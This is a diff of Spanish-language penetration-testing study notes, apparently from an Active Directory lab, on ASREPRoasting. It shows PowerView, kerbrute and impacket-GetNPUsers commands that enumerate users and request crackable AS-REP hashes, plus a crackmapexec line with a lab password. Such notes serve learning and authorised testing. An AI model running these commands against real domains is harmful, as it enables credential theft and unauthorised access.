@@ -82,7 +82,7 @@ crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
 ## ASREPRoasting
 
 Cualquier usuario del dominio puede solicitar un Ticket Granting Ticket (TGT) de una cuenta que tenga deshabilitada la opción de preautenticación kerberos.
-### Con powershell + rubeus
+### Con powerview + rubeus
 - Encontrar usuarios con `**DONT_REQ_PREAUTH`: `Get-DomainUser`
 	```powershell
 	Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
@@ -100,7 +100,10 @@ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
 ### Busqueda de usuarios + recuperación AS-REP: `GetNPUsers.py`
 Con esta herramienta podemos hacer lo mismo que con el comando anterior, pero necesitaremos una lista válida de usuarios del DC
 ```bash
-GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 
+# Sin credenciales y con una lista de usuarios
+impacket-GetNPUsers corp.com/ -dc-ip $dcip -no-pass -usersfile valid_ad_users 
+# Con credenciales de un usuario (pete)
+impacket-GetNPUsers -dc-ip $dcip  -request -outputfile hashes.asreproast corp.com/pete
 ```
 ### Descifrando el hash con hashcat
 ```bash
